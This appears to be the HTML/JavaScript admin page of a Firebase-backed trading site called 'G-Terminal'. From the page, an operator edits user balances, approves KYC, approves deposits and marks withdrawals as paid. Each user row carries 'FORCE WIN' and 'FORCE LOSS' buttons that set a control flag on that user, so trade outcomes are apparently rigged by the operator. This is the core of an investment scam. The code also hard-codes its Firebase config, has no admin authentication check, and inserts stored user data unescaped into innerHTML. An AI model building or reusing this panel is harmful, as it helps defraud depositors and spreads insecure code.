<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VIP Admin Panel | G-Terminal</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
    <style>
        :root { --bg: #0b0e11; --card: #1e2329; --yellow: #fcd535; --green: #0ecb81; --red: #f6465d; --text: #eaecef; }
        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; }
        .container { max-width: 1000px; margin: auto; }
        .section { background: var(--card); padding: 20px; border-radius: 15px; margin-bottom: 20px; border: 1px solid #2b3139; }
        h2 { color: var(--yellow); border-bottom: 1px solid #333; padding-bottom: 10px; margin-top: 0; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 14px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #2b3139; }
        th { color: #848e9c; font-weight: normal; }
        .btn { padding: 6px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 12px; }
        .btn-win { background: var(--green); color: white; }
        .btn-loss { background: var(--red); color: white; }
        .btn-approve { background: #2ebd85; color: white; }
        .btn-reject { background: #f6465d; color: white; }
        .status-badge { padding: 4px 8px; border-radius: 4px; font-size: 11px; }
        input { background: #2b3139; border: 1px solid #474d57; color: white; padding: 5px; border-radius: 4px; width: 80px; }
    </style>
</head>
<body>

<div class="container">
    <h1 style="color: var(--yellow);">Terminal Master Control 👑</h1>

    <div class="section">
        <h2>Users Management</h2>
        <table id="user-table">
            <thead>
                <tr>
                    <th>Name/Email</th>
                    <th>Balance ($)</th>
                    <th>KYC</th>
                    <th>Trade Control</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="user-list"></tbody>
        </table>
    </div>

    <div class="section">
        <h2>Pending Deposits</h2>
        <table id="deposit-table">
            <thead>
                <tr>
                    <th>Email</th>
                    <th>Amount</th>
                    <th>Method/TXID</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="deposit-list"></tbody>
        </table>
    </div>

    <div class="section">
        <h2>Pending Withdrawals</h2>
        <table id="withdraw-table">
            <thead>
                <tr>
                    <th>Email</th>
                    <th>Net Payout</th>
                    <th>Method/Acc</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="withdraw-list"></tbody>
        </table>
    </div>
</div>

<script>
    const firebaseConfig = { 
        apiKey: "AIzaSyCM_qmcvOXXjJrQHPiracy5SOpTjAJEnYU", 
        authDomain: "trade-for-profit-8b160.firebaseapp.com", 
        databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com", 
        projectId: "trade-for-profit-8b160", 
        storageBucket: "trade-for-profit-8b160.firebasestorage.app", 
        messagingSenderId: "1077014018991", 
        appId: "1:1077014018991:web:c41320e2ef10291afd4d5a" 
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // 1. Load Users & Trade Control
    db.ref('users').on('value', snap => {
        const list = document.getElementById('user-list');
        list.innerHTML = "";
        snap.forEach(userSnap => {
            const u = userSnap.val();
            const uid = userSnap.key;
            list.innerHTML += `
                <tr>
                    <td>${u.name}<br><small style="color:#848e9c">${u.email}</small></td>
                    <td><input type="number" value="${u.balance}" onchange="updateBal('${uid}', this.value)"></td>
                    <td><span class="status-badge" style="background:${u.kyc_status==='APPROVED'?'#2ebd85':'#555'}">${u.kyc_status}</span></td>
                    <td>
                        <button class="btn btn-win" onclick="setControl('${uid}', 'WIN')">FORCE WIN</button>
                        <button class="btn btn-loss" onclick="setControl('${uid}', 'LOSS')">FORCE LOSS</button>
                        <br><small>Current: <b>${u.control || 'NORMAL'}</b></small>
                    </td>
                    <td><button class="btn btn-approve" onclick="approveKYC('${uid}')">Approve KYC</button></td>
                </tr>`;
        });
    });

    // 2. Load Deposits
    db.ref('deposits').on('value', snap => {
        const list = document.getElementById('deposit-list');
        list.innerHTML = "";
        snap.forEach(depSnap => {
            const d = depSnap.val();
            if(d.status === "PENDING") {
                list.innerHTML += `
                    <tr>
                        <td>${d.email}</td>
                        <td>$${d.amount}</td>
                        <td>${d.method}<br><small>${d.txid}</small></td>
                        <td>
                            <button class="btn btn-approve" onclick="actionDep('${depSnap.key}', '${d.uid}', ${d.amount}, 'APPROVE')">✔</button>
                            <button class="btn btn-reject" onclick="actionDep('${depSnap.key}', '${d.uid}', 0, 'REJECT')">✖</button>
                        </td>
                    </tr>`;
            }
        });
    });

    // 3. Functions
    function updateBal(uid, val) { db.ref('users/'+uid).update({ balance: parseFloat(val) }); }
    function setControl(uid, type) { db.ref('users/'+uid).update({ control: type }); alert("Set to " + type); }
    function approveKYC(uid) { db.ref('users/'+uid).update({ kyc_status: 'APPROVED' }); }

    function actionDep(key, uid, amt, action) {
        if(action === 'APPROVE') {
            db.ref('users/'+uid).child('balance').transaction(curr => (curr || 0) + amt);
        }
        db.ref('deposits/'+key).update({ status: action === 'APPROVE' ? 'SUCCESS' : 'REJECTED' });
    }

    // Load Withdrawals (Simple logic)
    db.ref('withdrawals').on('value', snap => {
        const list = document.getElementById('withdraw-list');
        list.innerHTML = "";
        snap.forEach(wSnap => {
            const w = wSnap.val();
            if(w.status === "PENDING") {
                list.innerHTML += `
                    <tr>
                        <td>${w.email}</td>
                        <td>$${w.net_payout}</td>
                        <td>${w.method}<br><small>${w.account}</small></td>
                        <td>
                            <button class="btn btn-approve" onclick="db.ref('withdrawals/${wSnap.key}').update({status:'SUCCESS'})">Paid</button>
                        </td>
                    </tr>`;
            }
        });
    });
</script>
</body>
</html>
